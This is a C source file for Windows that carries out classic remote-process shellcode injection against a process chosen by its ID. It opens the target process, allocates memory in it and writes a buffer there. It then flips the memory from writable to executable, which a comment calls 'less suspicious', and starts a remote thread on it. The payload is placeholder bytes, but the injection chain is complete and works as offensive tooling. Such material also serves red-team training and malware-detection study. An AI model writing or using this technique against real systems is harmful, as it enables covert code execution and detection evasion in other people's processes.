#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/* Note: Compile to 64 bit binary, "gcc -m64 shellcode_injection.c -o shellcode_injection" */

int main(int argc, char * argv[]) {
    if (argc < 2) {
        printf("Usage: program.exe <PID>\n");
        return EXIT_FAILURE; 
    }

    DWORD PID = atoi(argv[1]);
    printf("Attempting to open a handle to process (%ld)\n", PID);

    DWORD pAccessRights = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    // get handle to the process 
    HANDLE hProcess = OpenProcess(pAccessRights, FALSE, PID);
  
    if (hProcess == NULL) { 
        printf("Could not get handle to process (%ld), error: %ld\n", PID, GetLastError()); 
        return EXIT_FAILURE; 
    }
    else {
        printf("Got a handle to process (%ld)\n", PID);
    }

    unsigned char fillerCode[] = "\x41\x41\x41\x41\x41\x41\x41";
    size_t fillerCodeSize = sizeof(fillerCode);

    // allocate buffer in the process memory 
    LPVOID buffer = VirtualAllocEx(hProcess, NULL, fillerCodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    if (buffer == NULL) {
        printf("Could not allocate memory in process (%ld), error: %ld\n", PID, GetLastError());
        return EXIT_FAILURE;
    }
    else {
        printf("Allocated %llu-bytes to memory in process (%ld) with RW permissions\n", fillerCodeSize, PID);
    }

    // write shellcode to buffer
    if(!WriteProcessMemory(hProcess, buffer, fillerCode, fillerCodeSize, NULL)) {
        printf("Could not write to memory in process (%ld), error: %ld\n", PID, GetLastError()); 
        return EXIT_FAILURE;
    }
    else {
        printf("Successfully wrote shellcode to memory in process (%ld)\n", PID);
    }

    DWORD prevPermission; 

    // change memory permissions to RX later (less suspicious)
    if (!VirtualProtectEx(hProcess, buffer, fillerCodeSize, PAGE_EXECUTE_READ, &prevPermission)) {
        printf("Failed to change permissions for memory in process (%ld), error: %ld\n", PID, GetLastError());
        return EXIT_FAILURE;
    }
    else {
        printf("Changed permissions for memory in process (%ld) to RX\n", PID);
    }

    DWORD TID;

    // create thread to run the payload 
    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, 0, &TID); 

    if (hThread == NULL) { 
        printf("Could not get handle to thread (%ld), error: %ld\n", TID, GetLastError()); 
        return EXIT_FAILURE; 
    }
    else {
        printf("Got a handle to thread (%ld)\n", TID);
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return EXIT_SUCCESS; 
}